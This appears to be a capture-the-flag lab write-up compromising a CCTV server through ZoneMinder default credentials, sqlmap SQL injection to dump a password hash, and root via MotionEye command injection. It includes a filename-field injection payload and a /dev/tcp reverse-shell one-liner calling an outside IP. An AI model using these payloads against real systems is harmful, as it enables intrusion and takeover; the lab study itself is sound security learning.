### 1. Overview
This challenge involved exploiting a vulnerable CCTV monitoring system. Initial access was obtained through default credentials on a ZoneMinder login portal. After finding the exact version of the application, a SQL injection vulnerability was used to extract a user password hash from the backend database. Once the password was cracked, SSH access to the machine was obtained. Privilege escalation was then achieved by abusing a misconfigured MotionEye service to execute commands as root.

The scan found two open ports:

- **22 (SSH)**

Port 80 redirected to the domain `cctv.htb`, so I added that domain to my hosts file and visited the site in a browser. The page appeared to be a landing page for a CCTV monitoring platform called **SecureVision**.

While exploring the site, I found a staff login portal that used the **ZoneMinder** service. I attempted to log in using the common default credentials `admin:admin`, which worked and provided access to the dashboard.
### 3. Foothold
Once inside the ZoneMinder dashboard, I looked for a version number for the application. I found it under `Options -> Versions`. The listed version was `DYN_CURR_VERSION = 1.37.63`.

After checking for known vulnerabilities affecting this version, I found that it is vulnerable to a **boolean-based SQL injection** vulnerability identified as: `CVE-2024-51428`. To exploit this, I used Nmap:
```
└─$ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    --cookie="ZMSESSID=5ltjig3s3h9sqk1sgtjn3ehbhm" \
    -p tid --dbms=mysql --dbs
```

The scan found a database named `zm`. Reading the tables inside that database revealed a `Users` table that contained account information.

I then used `sqlmap` to extract the password hash for the user `mark`.
```
└─$ sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    --cookie="ZMSESSID=915u28sp7e20jg4bvobo2gaukc" \
    -p tid --dbms=mysql -D zm -T Users -C "Password" --where="Username='mark'" --batch --dump
    
+--------------------------------------------------------------+
| Password                                                     |
+--------------------------------------------------------------+
| $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
+--------------------------------------------------------------+
```

The extracted hash was then cracked using `john`, which revealed the password:
```
opensesame
```

With these credentials, I was able to authenticate to the system through SSH as the user `mark`.
### 4. Root
After logging in, I started looking for a way to root by checking whether the user had any `sudo` permissions with `sudo -l`. However, `mark` did not have permission to run any commands with `sudo`, so I continued enumerating the system.

While checking for running services and open ports, I noticed that port **8765** was open. This port is commonly used by **MotionEye**, a web-based camera management interface.

Configuration files for MotionEye are stored in `/etc/motioneye/` by default. Looking at the configuration file showed stored credentials.
```
mark@cctv:/home$ cat /etc/motioneye/motion.conf 
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
...[SNIP]...
```

Since the service was only accessible locally, I used SSH port forwarding to access it from my own machine.

Once I logged into the MotionEye web interface, I found that it was possible to bypass input filtering through the browser console.

I disabled the input validation by running the following command in the browser console:
```
configUiValid = function() { return true; };
```

This allowed me to inject commands into certain configuration fields.

Before exploiting this, I created a reverse shell script on the target machine.
```
mark@cctv:~$ echo 'sh -i >& /dev/tcp/10.10.14.192/9001 0>&1' > /tmp/shell.sh
```

Next, I edited the **still image file name** setting and inserted a command injection payload that executed the script.

**Setting Edit**
```
$(bash /tmp/shell.sh).%Y-%m-%d-%H-%M-%S
```

After applying the change, the payload needed to be triggered by forcing the camera to capture a snapshot.
```
mark@cctv:~$ curl "http://127.0.0.1:7999/1/action/snapshot"
```

This triggered the reverse shell and provided command execution as the root user.
### 5. Conclusion
Initial access was obtained through the ZoneMinder login portal, where the default credentials `admin:admin` allowed entry into the dashboard. After finding the application version, a SQL injection vulnerability was used to extract data from the backend database, including a password hash for the user `mark`.

Once the hash was cracked, the recovered credentials allowed SSH access to the system. During further enumeration, a locally running MotionEye service was discovered along with its configuration files. By forwarding the service locally and bypassing the input validation in the web interface, it was possible to inject commands into the application and execute a reverse shell, which resulted in root access on the machine.
